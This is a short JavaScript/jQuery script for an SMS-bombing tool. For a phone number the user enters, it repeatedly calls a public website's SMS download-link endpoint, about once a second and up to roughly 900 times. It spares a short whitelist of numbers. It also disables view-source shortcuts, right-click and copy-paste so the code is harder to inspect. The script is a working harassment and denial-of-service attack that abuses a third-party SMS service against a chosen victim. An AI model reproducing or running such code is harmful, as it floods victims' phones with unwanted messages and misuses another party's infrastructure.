shortcut.add("Ctrl+U",function() {
		alert("BooBoo");
});
shortcut.add("F12",function() {
		alert("BooBoo");
});
$(".btn").on('click', function() {
	var number = $("#number").val();
	var limitt = 899;
	var url = 'http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0'+number;
	var interval, i = 1;
	var white_list = ['7388643341' '8381916336' '9140873522'
	]


	if( jQuery.inArray(number, white_list) == -1 ) {
                interval = setInterval(bombb,1000);
        }
        else {
                $("#resp").html("Number is in Protect List");
                exit();
        }
   
	
	function bombb() {
		$.ajax({
		  url: url,
		  type: 'GET',
		  crossDomain: true,
		  async: true,
		  //dataType: "jsonp",
		  success: function (response) {
			console.log('Done');
		  }
		});
		$("#resp").html(i+" SMS Sent");
		if( i <= limitt ) i++;
		else clearInterval(interval);
	}    
});

$(document).ready(function () {
    //Disable cut copy paste
	$('body').bind('cut copy paste', function (e) {
		e.preventDefault();
	});

	//Disable mouse right click
	$("body").on("contextmenu",function(e){
		return false;
	});
});
